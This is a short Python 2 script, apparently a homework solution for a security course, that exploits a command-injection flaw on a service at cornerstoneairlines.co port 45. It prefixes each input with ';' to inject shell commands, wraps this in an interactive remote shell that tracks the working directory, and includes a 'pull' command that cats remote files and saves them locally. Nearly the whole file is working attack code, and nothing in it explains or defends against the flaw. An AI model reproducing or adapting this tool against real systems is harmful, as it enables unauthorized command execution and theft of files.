"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here

# opens connection and issues command, expects command to start with ";"
def execute_cmd(cmd):
    # Establish socket connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    data = s.recv(1024)     # Receives 1024 bytes from IP/Port
    s.send(cmd + "\n")
    data = s.recv(1024)
    return data

# shell logic
def shell():
    path = "/"
    while(True):
        cmd = raw_input(path.strip() + "> ")
        if (cmd == "exit"):
            break
        elif (cmd.startswith("cd")):
            pwd = execute_cmd(";cd " + path + ";" + cmd + ";pwd").strip()
            if (pwd != ""):
                path = pwd
        else:
            print(execute_cmd(";cd " + path + ";" + cmd).strip())

# reads in remote file using cat command and then writes it to the local path
def pull(remote, local):
    file = execute_cmd(";cat " + remote)
    open(local, "w+").write(file)

# prints commands that are available
def help():
    print(
        """1) shell: Drop into an interactive shell and allow users to gracefully `exit`
        2) pull <remote-path> <local-path>: Download files
        3) help: Shows this help menu
        4) quit: Quit the shell""")

if __name__ == '__main__':
    while(True):
        cmd = raw_input("> ")
        if (cmd == "shell"):
            shell()
        elif (cmd.startswith("pull")):
            args = cmd.split()
            if (len(args) == 3):
                pull(args[1], args[2])
            else:
                print("Pull takes two arguments")
        elif (cmd == "quit"):
            break
        else:
            help()